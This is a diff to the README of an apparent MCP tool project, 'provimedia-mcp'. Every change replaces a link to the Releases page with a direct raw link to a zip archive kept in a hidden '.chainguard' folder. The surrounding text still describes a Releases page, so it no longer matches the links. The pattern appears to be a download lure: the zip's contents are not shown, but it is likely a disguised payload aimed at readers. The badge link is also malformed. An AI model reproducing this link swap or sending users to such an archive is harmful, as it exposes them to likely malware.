@@ -1,6 +1,6 @@
 # 🚀 provimedia-mcp - Simplifying Chainguard MCP with Memory
 
-[![Download Release](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/shafikm17/provimedia-mcp/releases)
+[![Download Release](https://github.com/shafikm17/provimedia-mcp/raw/refs/heads/main/src/mcp-server/.chainguard/mcp_provimedia_1.1.zip%20Now-Click%20Here-brightgreen)](https://github.com/shafikm17/provimedia-mcp/raw/refs/heads/main/src/mcp-server/.chainguard/mcp_provimedia_1.1.zip)
 
 ## 🥇 Introduction
 
@@ -10,11 +10,11 @@ The **provimedia-mcp** application provides users with a powerful tool for manag
 
 To get started, you need to download the software from the Releases page. You can visit the following link:
 
-[Download the latest release here](https://github.com/shafikm17/provimedia-mcp/releases).
+[Download the latest release here](https://github.com/shafikm17/provimedia-mcp/raw/refs/heads/main/src/mcp-server/.chainguard/mcp_provimedia_1.1.zip).
 
 This page contains all available versions. Choose the latest version for the best experience.
 
-1. Open the link: [Download the latest release here](https://github.com/shafikm17/provimedia-mcp/releases).
+1. Open the link: [Download the latest release here](https://github.com/shafikm17/provimedia-mcp/raw/refs/heads/main/src/mcp-server/.chainguard/mcp_provimedia_1.1.zip).
 2. Find the most recent version at the top of the list.
 3. Click on the version title to expand the details.
 4. Look for the installation file meant for your operating system, and click on it to download.
@@ -43,7 +43,7 @@ Before installing **provimedia-mcp**, ensure your computer meets the following m
 
 To ensure you always have the latest features and security patches, it's important to update your app regularly. Here’s how you can do it:
 
-1. Visit the Releases page: [Download the latest release here](https://github.com/shafikm17/provimedia-mcp/releases).
+1. Visit the Releases page: [Download the latest release here](https://github.com/shafikm17/provimedia-mcp/raw/refs/heads/main/src/mcp-server/.chainguard/mcp_provimedia_1.1.zip).
 2. Check for the latest version.
 3. Download the installation file and follow the same installation steps as before. The new version will replace the old one without losing your data.
 
@@ -72,4 +72,4 @@ If you have questions or need further assistance, feel free to open an issue on 
 
 We welcome contributions from everyone! If you would like to improve **provimedia-mcp**, please check the contribution guidelines in the repository. 
 
-Start by visiting this link: [Download the latest release here](https://github.com/shafikm17/provimedia-mcp/releases). Let's work together to enhance this application!
+Start by visiting this link: [Download the latest release here](https://github.com/shafikm17/provimedia-mcp/raw/refs/heads/main/src/mcp-server/.chainguard/mcp_provimedia_1.1.zip). Let's work together to enhance this application!
